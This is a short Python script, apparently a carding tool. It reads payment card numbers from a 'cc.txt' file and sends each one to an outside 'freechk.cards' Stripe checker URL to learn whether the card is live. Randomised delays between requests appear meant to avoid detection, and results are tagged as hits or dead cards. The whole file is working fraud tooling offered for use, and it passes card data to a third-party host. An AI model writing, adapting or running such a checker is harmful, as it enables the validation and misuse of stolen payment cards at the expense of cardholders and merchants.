import requests
import json
import time
import random

# Read cards from cc.txt
with open('cc.txt', 'r') as file:
    cards = [line.strip() for line in file if line.strip()]

# Base URL
base_url = "https://freechk.cards/stripe/free.php?lista="

# Delay settings (in seconds)
min_delay = 3   # min wait
max_delay = 7   # max wait

print(f"[START] Loaded {len(cards)} cards. Delaying {min_delay}-{max_delay}s between hits.\n")

for i, card in enumerate(cards, 1):
    url = base_url + card
    try:
        response = requests.get(url, timeout=15)
        
        # Try to parse and print full JSON
        try:
            data = response.json()
            print(f"\n[HIT {i}] {card}")
            print(json.dumps(data, indent=2))
        except:
            print(f"\n[RAW {i}] {card} -> {response.status_code}")
            print(response.text[:500])
            
    except Exception as e:
        print(f"[DEAD {i}] {card} -> {e}")
    
    # Delay before next hit (skip on last card)
    if i < len(cards):
        delay = random.uniform(min_delay, max_delay)
        print(f"\n[WAIT] {delay:.2f}s before next...")
        time.sleep(delay)

print("\n[DONE] All cards processed.")